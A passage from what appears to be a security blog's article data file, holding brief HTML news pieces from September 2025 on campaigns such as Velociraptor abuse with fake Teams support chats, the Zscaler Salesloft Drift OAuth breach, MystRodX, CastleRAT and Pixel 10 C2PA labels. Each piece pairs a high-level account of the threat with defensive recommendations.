        Attackers are now abusing <b>Velociraptor</b>, a legitimate open-source forensic tool, to sneak into enterprise 
        networks. At the same time, they’re launching <b>fake IT support chats</b> on <b>Microsoft Teams</b> — 
        tricking employees into handing over credentials or installing malware.  
      </p>
      <p>
        This dual-pronged campaign shows a dangerous shift: adversaries are moving away from sketchy tools and 
        toward <b>trusted platforms</b> to gain persistence and credibility inside organizations.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
     <br> <h3 style="color:#facc15;">⚙️ How the Attack Works</h3><br>
      <p>
        <b>Step 1:</b> Velociraptor, normally used for forensic investigations, is deployed by attackers to quietly collect 
        system data and map the environment.  
      </p>
      <p>
        <b>Step 2:</b> Employees receive what appears to be a legitimate <b>IT support message</b> in Microsoft Teams. 
        The attackers impersonate internal staff, claiming “system updates” or “security fixes” are needed.  
      </p>
      <p>
        <b>Step 3:</b> Victims are tricked into sharing login credentials or downloading malware disguised as updates, 
        giving attackers direct access to critical accounts and systems.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f766e,#134e4a); border-radius:12px; color:#f0fdfa; margin-top:15px;">
    <br>  <h3 style="color:#34d399;">🚨 Why It’s Dangerous</h3><br>
      <p>
        By abusing Velociraptor, attackers gain <b>legitimate visibility</b> into endpoints — the same way defenders do. 
        Combined with phishing inside a trusted collaboration platform like Teams, detection becomes much harder.  
      </p>
      <p>
        Traditional defenses rarely flag these moves, since both the forensic tool and Teams are seen as 
        “safe” by default. This lets adversaries operate <b>under the radar</b> while quietly escalating privileges.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
     <br> <h3 style="color:#2563eb;">🛡️ Defense Measures</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Audit and restrict use of admin/forensic tools like Velociraptor</li>
        <li>✔️ Monitor Teams chats for suspicious impersonation attempts</li>
        <li>✔️ Use strong MFA to reduce risk of stolen credentials</li>
        <li>✔️ Train employees to verify IT requests through official channels</li>
        <li>✔️ Deploy behavioral analytics to flag abnormal data collection</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#111827); border-radius:12px; color:#f5f5f5; margin-top:15px;">
     <br> <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        The abuse of <b>Velociraptor</b> and impersonation on <b>Microsoft Teams</b> prove a key reality: 
        even trusted tools and platforms can become attack vectors in the wrong hands.  
        Organizations must treat every login, chat, and tool invocation as potential risk — and 
        secure both human and technical trust boundaries before adversaries exploit them.  
      </p>
    </section>
  `},{id:"zscaler-salesloft-drift-breach-2025",title:"Zscaler Caught in Salesloft Drift OAuth Breach",summary:"Attackers accessed Salesforce data, exposing customer contacts, licensing info, and case details.",date:"2025-09-02",author:"EthicalByte",tags:["Zscaler","Salesloft","OAuth Breach","Supply Chain Attack","Salesforce"],imageKey:"zscalerSalesloftBreachBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ef4444;">🚨 The Breach Update</h3><br>
      <p>
        Security firm <b>Zscaler</b> has confirmed it is the latest victim of the ongoing <b>Salesloft Drift OAuth breach</b>. 
        Attackers gained access to its <b>Salesforce instance</b>, exfiltrating <b>customer contact information</b>, 
        <b>licensing details</b>, and portions of <b>support case text</b>.  
      </p>
      <p>
        While Zscaler reports <b>no evidence of misuse</b> so far, the fact that trusted SaaS integrations can lead to 
        this kind of exposure highlights the fragility of the <b>cloud supply chain</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#facc15;">⚙️ How the Attack Worked</h3><br>
      <p>
        The breach is tied to the earlier compromise of <b>Salesloft Drift OAuth tokens</b>, which granted unauthorized 
        access to integrated apps. For Zscaler, this meant attackers could pull data directly from Salesforce without 
        needing to breach the company’s own systems.  
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔑 OAuth tokens abused for seamless access</li>
        <li>📂 Customer & licensing data exfiltrated</li>
        <li>📝 Support case text partially exposed</li>
        <li>🚫 No direct breach of Zscaler’s core systems</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f766e,#134e4a); border-radius:12px; color:#f0fdfa; margin-top:15px;">
      <h3 style="color:#34d399;">🚨 Why It Matters</h3><br>
      <p>
        This isn’t just about Zscaler — it’s about the risks of <b>OAuth-based trust chains</b>. 
        Attackers no longer need to breach your firewall or servers; compromising a third-party app 
        integrated with your systems can yield the same access.  
      </p>
      <p>
        With more organizations connecting SaaS platforms for workflows, <b>identity and integration 
        security</b> is becoming just as critical as endpoint and network defense.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Response & Defense</h3><br>
      <p>
        Zscaler responded by <b>revoking unauthorized access</b> and <b>rotating all affected tokens</b>. 
        Customers have been notified, and additional monitoring is in place.  
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Review SaaS integrations and OAuth permissions</li>
        <li>✔️ Rotate credentials and tokens regularly</li>
        <li>✔️ Enforce least-privilege for API and app access</li>
        <li>✔️ Monitor for unusual access patterns in Salesforce & SaaS apps</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#111827); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        The Zscaler incident proves a critical point: <b>OAuth token abuse is the new attack vector</b>. 
        Defenders must treat third-party SaaS connections with the same scrutiny as external logins, 
        because one weak link in the trust chain can expose even the most security-conscious companies.
      </p>
    </section>
  `},{id:"mystrodx-backdoor-espionage-2025",title:"MystRodX: The Stealth Backdoor Built for Espionage",summary:"A secret-triggered malware linked to China’s Liminal Panda espionage group.",date:"2025-09-03",author:"EthicalByte",tags:["MystRodX","Backdoor","Espionage","APT","Liminal Panda"],imageKey:"mystrodxBackdoorBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ef4444;">💀 A Backdoor That Waits for the Ping</h3><br>
      <p>
        Security researchers have uncovered <b>MystRodX</b>, a stealthy backdoor designed for <b>long-term espionage operations</b>. 
        What makes it unique? It doesn’t constantly beacon to command-and-control servers. 
        Instead, MystRodX stays <b>silent and hidden</b> until it receives a carefully crafted <b>secret network ping</b>.  
      </p>
      <p>
        Once activated, it quietly opens the door for attackers to exfiltrate data, move laterally, 
        and manipulate systems without triggering early alerts.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#facc15;">⚙️ How MystRodX Works</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🛠 Installs silently on compromised systems, blending in with normal processes</li>
        <li>🕒 Remains dormant until triggered via a <b>covert ping sequence</b></li>
        <li>📂 Once active, enables file theft, system manipulation, and persistence</li>
        <li>🧩 Uses <b>modular components</b> to adapt for espionage targets</li>
      </ul>
      <p>
        This “sleep-until-called” design minimizes detection, making it ideal for nation-state spying.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f766e,#134e4a); border-radius:12px; color:#f0fdfa; margin-top:15px;">
      <h3 style="color:#34d399;">🔍 Linked to Liminal Panda</h3><br>
      <p>
        Researchers have attributed MystRodX to <b>Liminal Panda</b>, a Chinese state-backed espionage group known 
        for targeting governments, defense contractors, and high-value enterprises.  
      </p>
      <p>
        The group is infamous for precision intrusions, stealthy persistence, and custom malware families 
        designed to <b>live off the land</b> and exploit trust boundaries.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Why It Matters</h3><br>
      <p>
        MystRodX highlights the growing sophistication of <b>espionage-focused malware</b>. 
        Instead of noisy ransomware-style attacks, the goal is <b>long-term infiltration and intelligence gathering</b>. 
        Organizations often remain compromised for months before detection.
      </p>
      <p>
        This type of malware is especially dangerous for <b>governments, defense, finance, and research institutions</b>.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#111827); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        <b>MystRodX</b> is not built for chaos — it’s built for control.  
        By staying dormant until the right moment, it shows how espionage actors are evolving 
        to stay invisible while extracting maximum value.  
        The takeaway? <b>Silence doesn’t mean safety</b>. Dormant threats may already be lurking in your network.
      </p>
    </section>
  `},{id:"hexstrike-ai-weaponized-2025",title:"HexStrike AI: From Ethical Hacking Tool to Weaponized Exploit Engine",summary:"Hackers are abusing HexStrike AI to exploit Citrix flaws at scale.",date:"2025-09-04",author:"EthicalByte",tags:["HexStrike AI","Citrix","Exploits","AI in Cybercrime","Vulnerability"],imageKey:"hexstrikeAiWeaponizedBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ef4444;">⚠ When Defense Tools Turn Against Us</h3><br>
      <p>
        <b>HexStrike AI</b>, a platform originally built for <b>ethical hacking and security testing</b>, 
        has now been co-opted by cybercriminals. Researchers confirm that attackers are already using it to 
        exploit <b>fresh Citrix vulnerabilities</b>, turning a defensive innovation into an offensive cyber weapon.  
      </p>
      <p>
        What was designed to <b>protect networks</b> is now fueling <b>real-world cyberattacks at scale</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#facc15;">⚙ How HexStrike AI Is Being Misused</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔍 Originally designed for ethical vulnerability scanning</li>
        <li>💥 Adapted by hackers to <b>exploit zero-day and unpatched flaws</b></li>
        <li>📡 Current focus: <b>Citrix services</b>, already under active attack</li>
        <li>🚀 Automation via AI means exploits happen <b>faster and at larger scale</b></li>
      </ul>
      <p>
        This shift underscores how <b>dual-use AI tools</b> can blur the line between security and exploitation.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f766e,#134e4a); border-radius:12px; color:#f0fdfa; margin-top:15px;">
      <h3 style="color:#34d399;">🚨 Why It Matters</h3><br>
      <p>
        Citrix systems are widely deployed in <b>enterprises, governments, and critical infrastructure</b>. 
        With HexStrike AI automating the exploitation process, attackers can compromise targets at unprecedented speed.  
      </p>
      <p>
        This isn’t just a case of patched vs. unpatched — it’s about the <b>weaponization of AI security tools</b> 
        and the dangerous acceleration of the cyber threat lifecycle.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡 What Organizations Should Do</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔ Apply Citrix patches <b>immediately</b> — assume exploitation is already happening</li>
        <li>✔ Monitor for abnormal traffic patterns from Citrix environments</li>
        <li>✔ Restrict external exposure of Citrix services where possible</li>
        <li>✔ Audit the use of AI-driven pentesting tools in your environment</li>
        <li>✔ Prepare for AI-assisted threat actors becoming the norm</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#111827); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        <b>HexStrike AI</b> shows the double-edged nature of modern cybersecurity tools. 
        In the right hands, it’s a powerful defensive ally. In the wrong ones, it becomes an 
        <b>automated exploit engine</b>.  
        The takeaway is simple: <b>patch fast, monitor continuously, and plan for AI-driven adversaries</b>.
      </p>
    </section>
  `},{id:"genai-chatgpt-data-leak-2025",title:"Are Your Employees Leaking Secrets into ChatGPT?",summary:"Why most security tools can’t see GenAI traffic — and what that means for your data.",date:"2025-09-05",author:"EthicalByte",tags:["GenAI","ChatGPT","Data Loss Prevention","Insider Threat","AI Security"],imageKey:"genaiChatGPTLeakBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#f87171;">🚨 Secrets Flowing Into ChatGPT</h3><br>
      <p>
        Right now, employees across industries may be pasting sensitive data — 
        <b>emails, files, API keys, intellectual property</b> — directly into <b>ChatGPT</b> 
        and other AI assistants. Once entered, this information leaves your environment 
        and enters an ecosystem that most <b>DLP (Data Loss Prevention) tools simply cannot see</b>.
      </p>
      <p>
        The result? An invisible insider threat channel where confidential business information 
        flows into AI systems beyond your control.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#fbbf24;">🔍 Why DLP Tools Fail</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔒 GenAI traffic is often encrypted and routed outside standard corporate monitoring</li>
        <li>🤖 Most DLP tools were never designed to parse AI-specific data flows</li>
        <li>📡 Shadow IT: employees use personal devices & browsers beyond corporate visibility</li>
        <li>🕵️ Insider risk: sensitive content can be exposed without malicious intent</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#064e3b,#022c22); border-radius:12px; color:#d1fae5; margin-top:15px;">
      <h3 style="color:#34d399;">⚠️ Why This Matters</h3><br>
      <p>
        Generative AI introduces a <b>new blind spot</b> for enterprise security. 
        Unlike email or web uploads, AI interactions aren’t logged or monitored by default, 
        meaning critical intellectual property can leave the organization undetected.  
      </p>
      <p>
        In regulated industries like <b>finance, healthcare, and defense</b>, this creates 
        compliance and national security risks.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Defensive Measures</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Deploy GenAI-aware monitoring solutions</li>
        <li>✔️ Set policies for what data can/cannot be entered into AI tools</li>
        <li>✔️ Train employees on AI data risks</li>
        <li>✔️ Monitor browser and endpoint activity for unauthorized AI usage</li>
        <li>✔️ Explore proxy-based inspection of AI traffic flows</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#111827); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#f87171;">✅ Final Thoughts</h3><br>
      <p>
        Generative AI is here to stay — but so is the risk of <b>accidental data exfiltration</b>.  
        If your security stack can’t see AI traffic, you’re already blind to one of the fastest-growing insider risks.  
        The fix isn’t blocking AI entirely, but <b>monitoring and governing its use responsibly</b>.
      </p>
    </section>
  `},{id:"castlerat-trojan-tag150-2025",title:"CastleRAT: TAG-150’s New Trojan Expands CastleLoader Operations",summary:"Python & C-based malware capable of stealing passwords, hijacking wallets, logging keys, and full PC takeover.",date:"2025-09-06",author:"EthicalByte",tags:["CastleRAT","TAG-150","Trojan","Malware","Cybercrime"],imageKey:"castleRATBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0f172a,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#f87171;">🚨 Meet CastleRAT</h3><br>
      <p>
        A notorious cyber gang, <b>TAG-150</b>, has unveiled its latest weapon: <b>CastleRAT</b>, a 
        <b>Python & C-based trojan</b> engineered to expand their ongoing <b>CastleLoader operations</b>.  
        This new malware represents a dangerous step up in sophistication, combining multiple capabilities 
        into a single, powerful package.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#fbbf24;">⚙️ What CastleRAT Can Do</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔑 Steals saved <b>passwords</b> and credentials</li>
        <li>💰 Hijacks <b>cryptocurrency wallets</b></li>
        <li>⌨️ Logs <b>keystrokes</b> to capture sensitive input</li>
        <li>🖥️ Grants attackers <b>full remote control</b> over infected PCs</li>
      </ul>
      <p>
        Unlike one-dimensional malware, CastleRAT functions as an all-in-one espionage and theft tool — 
        maximizing attacker ROI per infection.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#064e3b,#022c22); border-radius:12px; color:#d1fae5; margin-top:15px;">
      <h3 style="color:#34d399;">🔍 Linked to CastleLoader Campaigns</h3><br>
      <p>
        CastleRAT is not a standalone threat — it integrates seamlessly with TAG-150’s <b>CastleLoader ecosystem</b>, 
        allowing rapid deployment and chaining of multiple malware families.  
      </p>
      <p>
        This tight integration suggests TAG-150 is scaling its infrastructure for <b>massive, sustained cybercrime operations</b>.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Defense Against CastleRAT</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Keep systems and apps patched to reduce initial infection vectors</li>
        <li>✔️ Deploy EDR solutions to detect trojan-like behaviors</li>
        <li>✔️ Monitor for unusual process injections and persistence attempts</li>
        <li>✔️ Train employees on phishing awareness — CastleLoader campaigns often start with malicious emails</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#0f172a); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#f87171;">✅ Final Thoughts</h3><br>
      <p>
        With <b>CastleRAT</b>, TAG-150 proves its evolution from nuisance to a full-fledged cybercrime syndicate.  
        The malware’s ability to combine credential theft, crypto hijacking, and remote control makes it a 
        <b>serious threat to both individuals and enterprises</b>.  
        Defenders must recognize that today’s trojans are no longer simple — they’re multi-purpose weapons 
        embedded in larger, organized crime ecosystems.
      </p>
    </section>
  `},{id:"barrelfire-noisybear-kazakhstan-2025",title:"BarrelFire: Russia-Linked Hackers Breach Kazakhstan’s Energy Giant",summary:"NoisyBear group exploited stolen accounts to deliver malware and backdoors through fake IT emails.",date:"2025-09-08",author:"EthicalByte",tags:["BarrelFire","NoisyBear","KazMunaiGas","Energy Sector","Cyber Espionage","Russia-linked APT"],imageKey:"barrelFireBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0f172a,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#f87171;">🚨 BarrelFire Targets KazMunaiGas</h3><br>
      <p>
        A <b>Russia-linked hacking group</b>, tracked as <b>NoisyBear</b>, has launched a sophisticated cyber operation 
        codenamed <b>BarrelFire</b> against Kazakhstan’s energy giant <b>KazMunaiGas</b>.  
        Attackers infiltrated the network using a <b>stolen employee account</b> to send 
        highly convincing <b>fake IT support emails</b> that contained booby-trapped ZIP files.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#fbbf24;">⚙ Attack Methodology</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📧 Spear-phishing emails disguised as IT support messages</li>
        <li>📦 ZIP archives containing hidden malware payloads</li>
        <li>🕵 Delivered a <b>remote access trojan (RAT)</b> for persistence</li>
        <li>🔓 Established a <b>backdoor channel</b> for long-term espionage</li>
      </ul>
      <p>
        By leveraging a real employee’s compromised account, attackers bypassed trust barriers and 
        significantly increased the success rate of infection.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#064e3b,#022c22); border-radius:12px; color:#d1fae5; margin-top:15px;">
      <h3 style="color:#34d399;">🔍 Why This Matters</h3><br>
      <p>
        Targeting <b>critical energy infrastructure</b> highlights the growing risk of 
        <b>state-linked cyber operations</b> in geopolitically sensitive regions.  
        The use of stolen credentials also underlines a persistent weakness: 
        <b>human identity remains the weakest link</b> in enterprise defenses.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡 Defensive Measures</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔ Enforce strong <b>MFA</b> to prevent stolen account abuse</li>
        <li>✔ Monitor <b>internal email anomalies</b> for insider-like threats</li>
        <li>✔ Deploy <b>EDR solutions</b> for detecting RAT activity</li>
        <li>✔ Conduct regular phishing simulations for staff awareness</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#0f172a); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#f87171;">✅ Final Thoughts</h3><br>
      <p>
        The BarrelFire operation shows how quickly a single stolen credential can escalate 
        into a <b>nation-state level cyber threat</b>.  
        For industries like energy, defense must go beyond firewalls — 
        it requires a proactive <b>identity-first security strategy</b>.
      </p>
    </section>
  `},{id:"ai-deepfake-fake-hires-2025",title:"AI-Powered Fake Hires: When Hackers Join Your Team",summary:"Deepfake candidates are slipping past interviews, getting onboarded, and stealing keys from the inside.",date:"2025-09-11",author:"EthicalByte",tags:["Insider Threat","Deepfake","AI Fraud","Recruitment Security","Cybersecurity"],imageKey:"fakeHireBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#3a0ca3,#7209b7); border-radius:12px; color:#f8f9fa;">
      <h3 style="color:#ffb703;">⚠ Hackers Aren’t Just Phishing — They’re Getting Hired</h3><br>
      <p>
        Cybercrime has entered the hiring process. Threat actors are now crafting <b>AI-generated resumes</b> and 
        using <b>deepfake video interviews</b> to infiltrate organizations. Unlike traditional phishing, these attacks 
        give adversaries <b>legitimate employee access</b> from day one. Once onboarded, they can quietly siphon off 
        <b>credentials, sensitive files, and even privileged keys</b> without raising alarms.
      </p>
      <p>
        This isn’t a “what if” scenario — it’s happening today, and companies that fail to recognize this new vector 
        risk <b>granting attackers the keys to their kingdom</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#00b4d8,#0077b6); border-radius:12px; color:#e0f7fa; margin-top:15px;">
      <h3 style="color:#ffdd00;">🕵 How Fake Hires Work</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📄 Hyper-polished <b>AI resumes</b> tailored to bypass HR filters</li>
        <li>🎥 <b>Deepfake interviewees</b> fool recruiters with realistic gestures & voices</li>
        <li>🔑 Successful candidates gain <b>system access, VPN credentials, and file shares</b></li>
        <li>🏃 After exfiltrating data or injecting malware, they vanish — leaving IT puzzled</li>
      </ul>
      <p>
        These aren’t isolated incidents. It’s a new <b>scalable model for insider threats</b>, 
        enabled by off-the-shelf AI tools.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#ff6f61,#d62828); border-radius:12px; color:#fff0f0; margin-top:15px;">
      <h3 style="color:#fff176;">🔍 Why This Is Different</h3><br>
      <p>
        Unlike malware or phishing emails that target the perimeter, fake hires bypass defenses by 
        <b>operating inside the network as trusted users</b>. Their actions blend in with legitimate activity, 
        making traditional monitoring tools blind to the threat. This marks a shift from external intrusion to 
        <b>internal compromise</b>, where the attacker already has what every hacker dreams of: valid credentials.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#fefae0,#faedcd); border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#d62828;">🛡 What Companies Must Do</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔ Apply <b>multi-layered identity verification</b> before and after hiring</li>
        <li>✔ Use <b>deepfake detection tools</b> during video interviews</li>
        <li>✔ Limit <b>system access</b> for new hires until trust is proven</li>
        <li>✔ Continuously <b>monitor behavioral anomalies</b> among employees</li>
      </ul>
      <p>
        Recruitment must now be treated with the same seriousness as endpoint security. Every hire is a potential 
        <b>attack surface</b>.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#03045e,#023e8a); border-radius:12px; color:#f1f1f1; margin-top:15px;">
      <h3 style="color:#ffb703;">✅ Final Thoughts</h3><br>
      <p>
        Hackers no longer need to <b>break in</b> — they can <b>walk in with a fake identity</b>.  
        As AI-powered deception grows, <b>identity becomes the new security perimeter</b>.  
        Companies that fail to adapt their hiring and monitoring processes are inviting adversaries 
        to join their payroll.
      </p>
    </section>
  `},{id:"google-pixel10-c2pa-2025",title:"Google Pixel 10 Adds Cryptographic Photo Labels",summary:"Pixel Camera becomes the first mobile device with top-rated C2PA authenticity tech",date:"2025-09-12",author:"EthicalByte",tags:["Google Pixel 10","C2PA","AI Authenticity","Deepfake Defense","Mobile Security"],imageKey:"pixel10C2PABanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#072f40,#0b5962); border-radius:12px; color:#f3fbfb;">
      <h3 style="color:#7be3ff;">📸 Photos With Cryptographic "Nutrition" Labels</h3><br>
      <p>
        Google’s new <b>Pixel 10</b> ships with built-in <b>C2PA</b> support: each photo can include a cryptographically signed provenance block — a compact "nutrition label" that records who created the image, what edits were applied, and whether AI tools were involved.
        This is a major step toward verifiable media: photographers, editors, platforms, and consumers can now trace an image’s lineage in a tamper-evident way.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#061826,#12343a); border-radius:12px; color:#e9fbff; margin-top:15px;">
      <h3 style="color:#9ff7ea;">🔐 Why This Matters</h3><br>
      <p>
        As generative AI increases the volume and realism of synthetic media, provenance becomes a practical defense. Cryptographic labels enable:
      </p>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>✔️ Immediate verification of origin and edit history</li>
        <li>✔️ Clear flags when AI-assisted editing or generation was used</li>
        <li>✔️ Platform signals to help automated moderation and newsroom verification</li>
      </ul>
      <p>
        Pixel 10 reaching a top security rating for C2PA on a mobile device is a first — and it pushes the industry standard for authenticity on everyday devices.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#084c61,#0f6b78); border-radius:12px; color:#eafcff; margin-top:15px;">
      <h3 style="color:#c6fff5;">🔎 Technical Details (How It Works)</h3><br>
      <p>
        The camera app can generate a signed provenance manifest using device-bound keys. Key points:
      </p>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>🔑 <b>Device attestation:</b> cryptographic keys anchored to the Pixel hardware sign the provenance metadata.</li>
        <li>🧾 <b>Provenance payload:</b> contains creator identity (optional), toolchain edits, timestamps, and flags for AI involvement per C2PA schemas.</li>
        <li>🔗 <b>Verification:</b> third parties can verify signatures against Google’s attestation service or via on-device checks.</li>
      </ul>
      <p>
        This model balances usability and security by embedding minimal, verifiable metadata that consumers and platforms can check quickly.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0b2940,#123249); border-radius:12px; color:#e6fbff; margin-top:15px;">
      <h3 style="color:#a7fff1;">⚠️ Limitations & Privacy Considerations</h3><br>
      <p>
        C2PA labels improve transparency, but they aren’t a silver bullet. Key caveats:
      </p>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>🕵️ <b>False trust risk:</b> provenance proves origin and edits, not intent — manipulated content can still be harmful.</li>
        <li>🔁 <b>Label removal:</b> metadata can be stripped if files are edited/exported improperly — platforms must preserve provenance.</li>
        <li>🔒 <b>Privacy trade-offs:</b> embedding creator identity is optional; implementers must balance attribution with user privacy and consent.</li>
      </ul>
      <p>
        Organizations must pair provenance with contextual checks (source reputation, content analysis) for robust trust decisions.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#f7fbff,#e6f7fb); border-radius:12px; color:#04292f; margin-top:15px;">
      <h3 style="color:#05668d;">🌍 Real-World Impact</h3><br>
      <ul style="margin-left:20px; line-height:1.7; color:#023e4a;">
        <li>📰 <b>Newsrooms:</b> Faster verification workflows for user submissions and social posts.</li>
        <li>⚖️ <b>Legal & Forensics:</b> Better provenance data for chain-of-custody in investigations.</li>
        <li>📱 <b>Social platforms:</b> Automated signals to reduce spread of manipulated media and label suspect content.</li>
      </ul>
      <p style="color:#033b45;">
        Over time, provenance at source could significantly reduce the effectiveness of deepfake disinformation campaigns.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#e8f8f9,#dff3f5); border-radius:12px; color:#022f34; margin-top:15px;">
      <h3 style="color:#017a9b;">🛠 Implementation Notes for Organizations</h3><br>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>🔁 Ensure ingestion pipelines preserve C2PA metadata (don’t strip manifests during re-encoding).</li>
        <li>🔍 Integrate provenance checks into editorial and moderation tooling.</li>
        <li>🧾 Log verifications and maintain audit trails for important content decisions.</li>
        <li>🔐 Consider enterprise policies around attribution to avoid exposing sensitive creator identities.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#083d51,#0b5567); border-radius:12px; color:#eafcff; margin-top:15px;">
      <h3 style="color:#7fffd4;">✅ Actionable Recommendations</h3><br>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>✔️ Adopt C2PA verification in content pipelines for critical channels (news, legal, enterprise comms).</li>
        <li>✔️ Educate users and editors about what provenance proves — and what it doesn’t.</li>
        <li>✔️ Work with vendors to maintain signature verification services and key revocation processes.</li>
        <li>✔️ Combine provenance with automated content analysis (AI-detection + context signals) for higher confidence.</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#062a35,#0b3d47); border-radius:12px; color:#e9fbff; margin-top:15px;">
      <h3 style="color:#9ff7ea;">🚀 Final Thoughts</h3><br>
      <p>
        The Pixel 10’s C2PA rollout signals a practical path toward trustworthy media at scale.  
